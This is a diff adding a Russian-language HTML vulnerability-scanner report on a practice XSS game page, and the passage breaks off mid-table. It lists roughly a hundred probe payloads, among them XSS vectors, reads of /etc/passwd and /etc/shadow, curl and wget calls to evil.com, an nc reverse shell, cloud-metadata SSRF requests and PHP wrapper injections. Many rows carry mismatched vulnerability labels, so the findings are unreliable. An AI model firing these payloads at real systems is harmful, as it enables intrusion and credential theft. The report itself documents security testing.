@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html lang="ru" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <title>Отчёт по сканированию уязвимостей</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+  <style>
+    body {
+      background-color: #212529;
+      color: #f8f9fa;
+    }
+    .table-dark {
+      background-color: #343a40;
+    }
+    .sev-Critical { background-color: #dc3545 !important; color: #fff; }
+    .sev-High { background-color: #fd7e14 !important; color: #fff; }
+    .sev-Medium { background-color: #ffc107 !important; color: #212529; }
+    .sev-Low { background-color: #198754 !important; color: #fff; }
+    .sev-Unknown { background-color: #6c757d !important; color: #fff; }
+    .payload-pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      max-width: 100%;
+      font-size: 0.875rem;
+    }
+    .chart-container {
+      position: relative;
+      height: 300px;
+      width: 100%;
+      margin-top: 20px;
+      margin-bottom: 40px;
+    }
+    td.text-break {
+      overflow-wrap: anywhere;
+    }
+  </style>
+</head>
+<body>
+  <div class="container py-4">
+    <h1 class="mb-3">🔒 Отчёт по сканированию уязвимостей</h1>
+    <h5 class="mb-4">Версия сканера: 5.1 | Дата: 2025-05-09 22:55:05</h5>
+
+    <div class="row mb-3">
+      <div class="col-md-6">
+        <h4>🎯 Цель сканирования</h4>
+        <p class="text-break">https://xss-game.appspot.com/level1/frame</p>
+      </div>
+      <div class="col-md-6">
+        <h4>📦 Информация о CMS</h4>
+        <p><strong>CMS:</strong> Не определено, <strong>Версия:</strong> N/A</p>
+      </div>
+    </div>
+
+    <h4>📊 Распределение по уровням важности</h4>
+    <div class="chart-container">
+      <canvas id="chart"></canvas>
+    </div>
+
+    <h4>🛡️ Найденные уязвимости</h4>
+    <div class="table-responsive mb-4">
+      <table class="table table-hover table-dark align-middle">
+        <thead>
+          <tr>
+            <th>Важность</th>
+            <th>Тип</th>
+            <th>URL</th>
+            <th>Payload</th>
+          </tr>
+        </thead>
+        <tbody>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003csvg/onload=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cimg src=x onerror=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\"\u0027\u003e\u003cscript\u003ewindow.xssFlag=1\u003c/script\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cbody onload=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003ciframe srcdoc=\u0027\u003cscript\u003ewindow.xssFlag=1\u003c/script\u003e\u0027\u003e\u003c/iframe\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "javascript:window.xssFlag=1"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "onmouseover=window.xssFlag=1"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cscript\u003ewindow.xssFlag=1\u003c/script\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cscript src=\u0027javascript:window.xssFlag=1\u0027\u003e\u003c/script\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cimg src=\u0027x\u0027 onerror=\u0027window.xssFlag=1\u0027\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cvideo onerror=\u0027window.xssFlag=1\u0027 src=\u0027x\u0027\u003e\u003c/video\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003caudio onerror=\u0027window.xssFlag=1\u0027 src=\u0027x\u0027\u003e\u003c/audio\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cdetails open ontoggle=\u0027window.xssFlag=1\u0027\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cinput onfocus=\u0027window.xssFlag=1\u0027 autofocus\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003ctextarea onfocus=\u0027window.xssFlag=1\u0027 autofocus\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cselect onchange=\u0027window.xssFlag=1\u0027\u003e\u003coption\u003e1\u003c/option\u003e\u003c/select\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cmarquee onstart=\u0027window.xssFlag=1\u0027\u003etest\u003c/marquee\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cscr\u003cscript\u003eipt\u003ewindow.xssFlag=1\u003c/script\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cimg src=x onerror=\u0026#119;\u0026#105;\u0026#110;\u0026#100;\u0026#111;\u0026#119;\u0026#46;\u0026#120;\u0026#115;\u0026#115;\u0026#70;\u0026#108;\u0026#97;\u0026#103;\u0026#61;\u0026#49;\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "jaVasCript:window.xssFlag=1"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "data:text/html,\u003cscript\u003ewindow.xssFlag=1\u003c/script\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "vbscript:Execute(\u0027window.xssFlag=1\u0027)"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0026lt;script\u0026gt;window.xssFlag=1\u0026lt;/script\u0026gt;"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0026#x3C;script\u0026#x3E;window.xssFlag=1\u0026#x3C;/script\u0026#x3E;"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cmeta http-equiv=\u0027refresh\u0027 content=\u00270;url=javascript:window.xssFlag=1\u0027\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cobject data=\u0027javascript:window.xssFlag=1\u0027\u003e\u003c/object\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cembed src=\u0027javascript:window.xssFlag=1\u0027\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cform\u003e\u003cbutton formaction=\u0027javascript:window.xssFlag=1\u0027\u003eClick\u003c/button\u003e\u003c/form\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cisindex type=image src=1 onerror=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cbase href=\u0027javascript:window.xssFlag=1//\u0027\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../../../../../../etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "..\\..\\..\\..\\windows\\win.ini"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/....//....//etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/var/www/html../../../../etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/etc/passwd%00"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/etc/shadow"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/etc/hosts"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../../../../../../windows/system32/drivers/etc/hosts"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../../../../../../boot.ini"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "test;id"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "$(id)"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "`id`"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0026whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0026\u0026whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";cat /etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|cat /etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0026\u0026cat /etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";ls -la"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|ls -la"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "$(whoami)"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "`whoami`"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";ping -c 1 127.0.0.1"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|ping -c 1 127.0.0.1"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";curl http://evil.com"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|curl http://evil.com"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";wget http://evil.com -O /tmp/test"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|wget http://evil.com -O /tmp/test"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";bash -c \u0027whoami\u0027"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|bash -c \u0027whoami\u0027"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";sh -c \u0027whoami\u0027"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";nc -e /bin/sh 127.0.0.1 4444"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|nc -e /bin/sh 127.0.0.1 4444"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";powershell -c whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|powershell -c whoami"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";cmd.exe /c dir"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|cmd.exe /c dir"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": ";echo $PATH"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "|echo $PATH"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>SSRF</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://169.254.169.254/latest/meta-data/"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>SSRF</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://169.254.169.254/latest/user-data/"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>SSRF</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://169.254.169.254/latest/api/token"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>SSRF</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://169.254.169.254/computeMetadata/v1/"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>SSRF</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://169.254.169.254/latest/dynamic/instance-identity/document"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "php://filter/convert.base64-encode/resource=index.php"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../../../../../../windows/system32/drivers/etc/hosts"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/etc/shadow"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/etc/hosts"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/var/www/html/config.php"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/var/www/html/wp-config.php"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/etc/passwd%00"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "/....//....//etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "php://filter/convert.base64-encode/resource=config.php"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4="
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "expect://id"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "file:///etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cscript\u003ewindow.xssFlag=1\u003c/script\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cscript\u003ewindow.xssFlag=1\u003c/script\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u0027 OR 1=1-- "
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>Path Traversal (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>LFI/RFI (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "../../../etc/passwd"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "http://169.254.169.254/latest/meta-data/"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003csvg/onload=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003csvg/onload=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cimg src=x onerror=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "\u003cimg src=x onerror=window.xssFlag=1\u003e"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-High">High</td>
+            <td>XSS (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
+  "query": "javascript:window.xssFlag=1"
+}</pre></td>
+          </tr>
+          
+          <tr>
+            <td class="sev-Critical">Critical</td>
+            <td>OS Command Injection (fuzz)</td>
+            <td class="text-break">https://xss-game.appspot.com/level1/frame</td>
+            <td><pre class="payload-pre">{
